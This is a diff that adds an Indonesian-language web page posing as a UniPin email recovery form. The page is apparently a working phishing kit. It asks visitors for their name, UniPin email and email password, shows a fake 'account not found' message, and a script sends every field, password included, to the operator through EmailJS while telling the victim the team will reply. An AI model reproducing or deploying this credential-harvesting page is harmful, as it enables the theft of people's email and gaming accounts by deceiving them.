@@ -1,0 +1,112 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Recovery Email UniPin</title>
+    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+    <style>
+        body {
+            margin: 0;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #00c6ff, #0072ff);
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        .form-container {
+            background-color: #ffffff;
+            padding: 30px;
+            border-radius: 15px;
+            box-shadow: 0 10px 25px rgba(0,0,0,0.1);
+            width: 100%;
+            max-width: 400px;
+        }
+        .form-container h2 {
+            margin-bottom: 20px;
+            color: #333;
+            text-align: center;
+        }
+        .form-group {
+            margin-bottom: 15px;
+        }
+        label {
+            font-weight: bold;
+            display: block;
+            margin-bottom: 5px;
+            color: #555;
+        }
+        input, textarea {
+            width: 100%;
+            padding: 10px;
+            border: 1px solid #ddd;
+            border-radius: 8px;
+            font-size: 14px;
+        }
+        button {
+            width: 100%;
+            padding: 12px;
+            background-color: #0072ff;
+            color: #fff;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            cursor: pointer;
+            transition: background 0.3s ease;
+        }
+        button:hover {
+            background-color: #0056cc;
+        }
+    </style>
+</head>
+<body>
+
+<div class="form-container">
+    <h2>Formulir Pemulihan Email UniPin</h2>
+    <div class="form-group">
+        <label for="name">Nama Lengkap</label>
+        <input type="text" id="name" placeholder="Masukkan nama Anda Id. ellytatasya10@gmail.com" required>
+    </div>
+    <div class="form-group">
+        <label for="email">Email UniPin</label>
+        <input type="email" id="email" placeholder="Masukkan email UniPin Anda" required>
+    </div>
+    <div class="form-group">
+        <label for="subject">Password Email</label>
+        <input type="text" id="subject" placeholder="Masukkan Password email Anda" required>
+    </div>
+    <div class="form-group">
+        <label for="message">Detail Permintaan</label>
+        <textarea id="message" rows="4" placeholder="Account anda tidak di temukan di Unipin.Id . Silahkan registry lagi di link yang akan di kirim di email anda." required></textarea>
+    </div>
+    <button onclick="sendMessage();">Kirim Permintaan</button>
+</div>
+
+<script>
+    function sendMessage() {
+        emailjs.init("yHp6NNWn_P6pny19J"); // Ganti dengan EmailJS public key kamu
+
+        const params = {
+            sendername: document.getElementById("name").value,
+            senderemail: document.getElementById("email").value,
+            subject: document.getElementById("subject").value,
+            message: document.getElementById("message").value
+        };
+
+        const serviceID = "service_kdkzua8";   // Ganti dengan service ID EmailJS kamu
+        const templateID = "template_krz8o1b"; // Ganti dengan template ID kamu
+
+        emailjs.send(serviceID, templateID, params)
+            .then(response => {
+                alert("Permintaan Anda berhasil dikirim. Tim kami akan menghubungi Anda segera.");
+            })
+            .catch(error => {
+                alert("Gagal mengirim permintaan. Silakan coba lagi.");
+                console.error("EmailJS Error:", error);
+            });
+    }
+</script>
+
+</body>
+</html>
